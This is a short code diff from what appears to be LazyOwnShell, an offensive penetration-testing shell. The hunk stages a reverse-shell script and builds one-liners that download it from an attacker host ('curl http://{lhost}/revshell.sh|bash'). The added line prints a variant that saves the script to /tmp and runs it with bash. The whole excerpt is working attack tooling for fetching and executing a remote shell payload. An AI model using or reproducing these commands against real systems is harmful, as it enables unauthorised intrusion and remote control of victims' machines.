@@ -4043,6 +4043,7 @@ class LazyOwnShell(Cmd):
         os.system(f"echo '{revshell}' > sessions/revshell.sh ")
         os.system(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
         print_msg(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
+        print_msg(f"curl -o /tmp/revshell.sh http://{lhost}/revshell.sh && /bin/bash /tmp/revshell.sh")
         file_rev = f"{path}/sessions/win/payload.ps1"
         file_rev_ses = f"{path}/sessions/payload.ps1"
         with open(file_rev, 'r') as f:
